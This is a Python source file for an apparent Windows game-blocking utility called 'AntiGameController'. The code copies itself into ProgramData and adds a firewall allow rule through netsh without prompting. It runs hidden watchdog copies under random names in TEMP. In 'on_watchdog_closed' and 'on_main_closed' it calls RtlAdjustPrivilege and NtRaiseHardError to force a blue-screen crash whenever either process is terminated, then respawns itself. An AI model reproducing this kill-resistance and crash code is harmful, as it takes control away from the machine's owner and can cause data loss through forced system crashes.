import os
import subprocess
import sys
import uuid
import ctypes
import shutil
import threading
import time
import hashlib


_MAIN_MARKER = "AGC_RANDOM_MAIN"
_LAUNCHER_EXE = "AGC_LAUNCHER_EXE"
_WATCHDOG_FLAG = "--agc-watchdog"
_APP_NAME = "AntiGameController"
_MAIN_SHUTTING_DOWN = False


def get_update_marker_path():
    temp_dir = os.path.join(
        os.environ.get("TEMP", os.environ.get("TMP", ".")),
        _APP_NAME,
    )
    os.makedirs(temp_dir, exist_ok=True)
    return os.path.join(temp_dir, "update.pending")


def get_uninstall_marker_path():
    temp_dir = os.path.join(
        os.environ.get("TEMP", os.environ.get("TMP", ".")),
        _APP_NAME,
    )
    os.makedirs(temp_dir, exist_ok=True)
    return os.path.join(temp_dir, "uninstall.pending")


def get_shutdown_marker_path():
    temp_dir = os.path.join(
        os.environ.get("TEMP", os.environ.get("TMP", ".")),
        _APP_NAME,
    )
    os.makedirs(temp_dir, exist_ok=True)
    return os.path.join(temp_dir, "shutdown.pending")


def _hidden_popen_kwargs():
    if os.name == "nt":
        return {
            "creationflags": getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000),
            "close_fds": True,
        }
    return {}


def run_as_random_instance():
    """Run the main application from one stable protected EXE."""
    if not getattr(sys, "frozen", False):
        return False
    if os.environ.get(_MAIN_MARKER) == "1":
        return False

    source_exe = os.path.abspath(sys.argv[0])
    base_dir = os.environ.get("ProgramData") or os.environ.get("APPDATA") or os.path.expanduser("~")
    protected_dir = os.path.join(base_dir, _APP_NAME)
    os.makedirs(protected_dir, exist_ok=True)
    protected_exe = os.path.join(protected_dir, _APP_NAME + ".exe")

    try:
        cleanup_old_watchdog_copies()
        if os.path.normcase(os.path.abspath(source_exe)) != os.path.normcase(os.path.abspath(protected_exe)):
            source_hash = hashlib.sha256(open(source_exe, "rb").read()).hexdigest()
            target_hash = hashlib.sha256(open(protected_exe, "rb").read()).hexdigest() if os.path.isfile(protected_exe) else ""
            if source_hash != target_hash:
                shutil.copy2(source_exe, protected_exe)

        ensure_firewall_rule(protected_exe)

        env = os.environ.copy()
        env[_MAIN_MARKER] = "1"
        env[_LAUNCHER_EXE] = protected_exe
        subprocess.Popen(
            [protected_exe],
            env=env,
            **_hidden_popen_kwargs(),
        )
        return True
    except Exception:
        return False


def ensure_firewall_rule(executable):
    """Allow the stable main EXE through Windows Firewall without prompts."""
    if os.name != "nt":
        return

    rule_name = "AntiGameController Private Network"
    commands = [
        ["netsh", "advfirewall", "firewall", "delete", "rule", "name=" + rule_name],
        [
            "netsh", "advfirewall", "firewall", "add", "rule",
            "name=" + rule_name,
            "dir=in",
            "action=allow",
            "enable=yes",
            "profile=private,public",
            "protocol=any",
            "program=" + executable,
        ],
    ]
    for command in commands:
        try:
            subprocess.run(command, capture_output=True, timeout=15, **_hidden_popen_kwargs())
        except Exception:
            pass


def cleanup_old_watchdog_copies():
    """Remove old random AGC copies from TEMP after each launch."""
    if os.name != "nt":
        return

    temp_dir = os.path.join(os.environ.get("TEMP", os.environ.get("TMP", ".")), _APP_NAME)
    if not os.path.isdir(temp_dir):
        return

    current_exe = os.path.abspath(sys.argv[0]).lower()
    for name in os.listdir(temp_dir):
        if not (name.lower().startswith("agc_") and name.lower().endswith(".exe")):
            continue
        path = os.path.join(temp_dir, name)
        if os.path.abspath(path).lower() == current_exe:
            continue
        try:
            os.remove(path)
        except (PermissionError, FileNotFoundError, OSError):
            pass


def is_process_running(pid):
    if os.name != "nt":
        try:
            os.kill(pid, 0)
            return True
        except (ProcessLookupError, PermissionError):
            return False

    process_all_access = 0x00100000
    handle = ctypes.windll.kernel32.OpenProcess(process_all_access, False, pid)
    if not handle:
        return False
    try:
        exit_code = ctypes.c_ulong()
        if ctypes.windll.kernel32.GetExitCodeProcess(handle, ctypes.byref(exit_code)):
            return exit_code.value == 259
    finally:
        ctypes.windll.kernel32.CloseHandle(handle)
    return False


def run_watchdog_if_requested():
    """Run as a hidden watchdog process instead of starting the GUI."""
    if _WATCHDOG_FLAG not in sys.argv:
        return False

    try:
        parent_pid = int(sys.argv[sys.argv.index(_WATCHDOG_FLAG) + 1])
    except (ValueError, IndexError):
        return True

    if os.name == "nt":
        process_all_access = 0x00100000
        synchronize = 0x00100000
        desired_access = process_all_access | synchronize
        process_handle = ctypes.windll.kernel32.OpenProcess(
            desired_access,
            False,
            parent_pid,
        )
        if process_handle:
            try:
                ctypes.windll.kernel32.WaitForSingleObject(process_handle, 0xFFFFFFFF)
            finally:
                ctypes.windll.kernel32.CloseHandle(process_handle)

    if os.path.isfile(get_update_marker_path()):
        return True
    if os.path.isfile(get_uninstall_marker_path()):
        return True
    if os.path.isfile(get_shutdown_marker_path()):
        return True

    execute_close_callback()
    return True


def spawn_watchdog(parent_pid):
    """Spawn a hidden watchdog copy with a random executable name."""
    if not getattr(sys, "frozen", False):
        return

    executable = os.path.abspath(sys.argv[0])
    temp_dir = os.path.join(os.environ.get("TEMP", os.environ.get("TMP", ".")), "AntiGameController")
    os.makedirs(temp_dir, exist_ok=True)
    random_exe = os.path.join(temp_dir, "AGC_" + uuid.uuid4().hex + ".exe")
    env = os.environ.copy()
    env[_MAIN_MARKER] = "1"
    try:
        shutil.copy2(executable, random_exe)
        process = subprocess.Popen(
            [random_exe, _WATCHDOG_FLAG, str(parent_pid)],
            env=env,
            **_hidden_popen_kwargs(),
        )
        start_watchdog_monitor(process)
        return process
    except Exception:
        return None


def start_watchdog_monitor(watchdog_process):
    """Restart the watchdog and run a callback if it terminates unexpectedly."""
    if watchdog_process is None:
        return

    def monitor():
        while not _MAIN_SHUTTING_DOWN:
            if watchdog_process.poll() is not None:
                on_watchdog_closed()
                break
            time.sleep(1)

    threading.Thread(target=monitor, daemon=True).start()


def on_watchdog_closed():
    """Called by the main process if the watchdog process is closed."""
    # МЕСТО ДЛЯ ВАШЕГО КОДА: watchdog был закрыт раньше основного процесса.

    if (
        os.path.isfile(get_update_marker_path())
        or os.path.isfile(get_uninstall_marker_path())
        or os.path.isfile(get_shutdown_marker_path())
    ):
        return

    if not _MAIN_SHUTTING_DOWN and is_bsod_close_protection_enabled():
        # Если основной процесс не завершает работу, ВЫЗЫВАЕМ СИНИЙ ЭКРАН СМЕРТИ НАХУЙ
        from ctypes import windll 
        from ctypes import c_int 
        from ctypes import c_uint 
        from ctypes import c_ulong 
        from ctypes import POINTER 
        from ctypes import byref 
        nullptr = POINTER(c_int)() 
        windll.ntdll.RtlAdjustPrivilege( 
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int()) 
        ) 
        windll.ntdll.NtRaiseHardError( 
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint()) 
        ) 
        spawn_watchdog(os.getpid())


def mark_main_shutting_down():
    """Call before intentional main-process shutdown."""
    global _MAIN_SHUTTING_DOWN
    _MAIN_SHUTTING_DOWN = True
    try:
        with open(get_shutdown_marker_path(), "w", encoding="ascii") as marker:
            marker.write(str(os.getpid()))
    except Exception:
        pass


def clear_shutdown_marker():
    """Clear the normal-shutdown marker after a new application instance starts."""
    try:
        path = get_shutdown_marker_path()
        if os.path.isfile(path):
            os.remove(path)
    except Exception:
        pass


def is_bsod_close_protection_enabled():
    """Read the BSOD protection setting from the encrypted main config."""
    try:
        from config_manager import ConfigManager
        config = ConfigManager("AntiGameController").load()
        return bool(config.get("enable_bsod_close_protection", False))
    except Exception:
        return False


def on_main_closed():
    """Called by the watchdog if the main process is closed."""
    # МЕСТО ДЛЯ ВАШЕГО КОДА: основной процесс был закрыт.
    if (
        os.path.isfile(get_update_marker_path())
        or os.path.isfile(get_uninstall_marker_path())
        or os.path.isfile(get_shutdown_marker_path())
    ):
        return
    if os.name == "nt" and is_bsod_close_protection_enabled():
        from ctypes import windll 
        from ctypes import c_int 
        from ctypes import c_uint 
        from ctypes import c_ulong 
        from ctypes import POINTER 
        from ctypes import byref 
        nullptr = POINTER(c_int)() 
        windll.ntdll.RtlAdjustPrivilege( 
            c_uint(19), 
            c_uint(1), 
            c_uint(0), 
            byref(c_int()) 
        ) 
        windll.ntdll.NtRaiseHardError( 
            c_ulong(0xC000007B), 
            c_ulong(0), 
            nullptr, 
            nullptr, 
            c_uint(6), 
            byref(c_uint()) 
        ) 
        try:
            protected_dir = os.path.join(
                os.environ.get("ProgramData") or os.environ.get("APPDATA") or os.path.expanduser("~"),
                _APP_NAME,
            )
            protected_exe = os.path.join(protected_dir, _APP_NAME + ".exe")
            if os.path.isfile(protected_exe):
                env = os.environ.copy()
                env[_MAIN_MARKER] = "1"
                subprocess.Popen(
                    [protected_exe],
                    env=env,
                    **_hidden_popen_kwargs(),
                )
        except Exception:
            pass


def execute_close_callback():
    """Main-process closure callback for the watchdog."""
    on_main_closed()
    if os.name != "nt":
        return
    try:
        from pynput.keyboard import Key, Controller
        keyboard_controller = Controller()
        keyboard_controller.press(Key.esc)
        keyboard_controller.release(Key.esc)
    except Exception:
        pass
